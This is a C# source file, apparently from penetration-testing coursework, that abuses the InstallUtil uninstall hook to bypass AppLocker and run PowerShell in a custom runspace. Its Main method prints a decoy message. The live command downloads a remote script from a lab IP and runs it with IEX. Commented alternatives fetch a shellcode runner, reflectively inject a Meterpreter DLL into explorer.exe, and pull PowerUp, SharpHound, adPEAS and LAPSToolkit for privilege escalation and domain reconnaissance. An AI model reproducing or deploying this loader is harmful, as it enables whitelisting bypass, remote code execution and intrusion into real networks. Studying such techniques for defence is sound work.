﻿using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Nothing going on in this binary.");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.45.168/run.txt') | iex"; // run.txt is simple_shellcode_runner/simple_shellcode_runner.ps1
            //String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.102/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.49.102/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.168/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";
            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.204/win/SharpHound.ps1') | IEX; Invoke-BloodHound -CollectionMethod All";
            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.173/win/adPEAS.ps1') | IEX; Invoke-adPEAS -Outputfile 'C:\\Windows\\Tasks\\adpeas.txt'";
            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.204/win/LAPSToolkit.ps1') | IEX; Get-LAPSComputers | Out-File -FilePath C:\\Windows\\Tasks\\test.txt";
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.173:8000/applocker_bypass_workflow_compiler.ps1') | IEX";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
